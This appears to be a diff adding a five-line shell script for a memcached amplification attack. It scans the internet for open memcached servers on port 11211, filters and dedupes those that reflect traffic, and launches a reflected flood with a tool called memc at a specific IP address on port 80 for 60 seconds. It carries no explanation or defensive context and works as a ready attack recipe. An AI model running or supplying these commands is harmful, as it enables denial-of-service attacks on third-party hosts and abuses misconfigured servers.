@@ -1,0 +1,5 @@
+zmap -p 11211 --probe-args=file:memcache_11211.pkt -o 11211.txt
+./memc_checker 11211.txt memc1.txt 80 100
+cat memc1.txt | sort | uniq > memc2.txt
+php setup.php aaaaaaaa memc2.txt memclist.txt 1 100
+./memc 206.212.246.10 80 memclist.txt 1 -1 60
